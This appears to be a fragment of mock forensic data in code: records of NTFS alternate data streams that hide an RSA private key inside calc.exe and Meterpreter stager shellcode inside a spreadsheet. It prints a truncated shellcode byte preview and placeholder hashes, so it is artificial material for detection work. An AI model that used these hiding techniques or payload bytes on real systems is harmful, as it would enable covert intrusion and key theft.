  {
    id: 'ads-03',
    parentFilePath: 'C:\\Windows\\System32\\calc.exe',
    parentFileSizeBytes: 27648,
    streamName: ':privkey.pem',
    fullStreamPath: 'C:\\Windows\\System32\\calc.exe:privkey.pem',
    streamType: '$DATA',
    streamSizeBytes: 1675,
    sha256: 'a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0',
    detectionClassification: 'COVERT_STORAGE',
    createdUtc: '2026-08-31 14:14:02 UTC',
    extractedPath: '/mnt/forensic_vault/EXTRACTED_STREAMS/calc_privkey.pem',
    previewSnippet: `-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0s7eN9x4qV... (Encrypted RSA-2048 private key embedded into system binary stream)`
  },
  {
    id: 'ads-04',
    parentFilePath: 'C:\\Users\\architect\\Desktop\\Quarterly_Budget.xlsx',
    parentFileSizeBytes: 184320,
    streamName: ':obfuscated_meterpreter.bin',
    fullStreamPath: 'C:\\Users\\architect\\Desktop\\Quarterly_Budget.xlsx:obfuscated_meterpreter.bin',
    streamType: '$DATA',
    streamSizeBytes: 8192,
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    detectionClassification: 'OBFUSCATED_SCRIPT',
    createdUtc: '2026-08-31 14:15:10 UTC',
    extractedPath: '/mnt/forensic_vault/EXTRACTED_STREAMS/Quarterly_Budget_meterpreter.bin',
    previewSnippet: `FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51 56 48 31 D2 65 48 8B 52 60 48 8B 52 18 48 8B 52 20... (x64 Meterpreter Stage 1 Stager Shellcode)`
  }
];
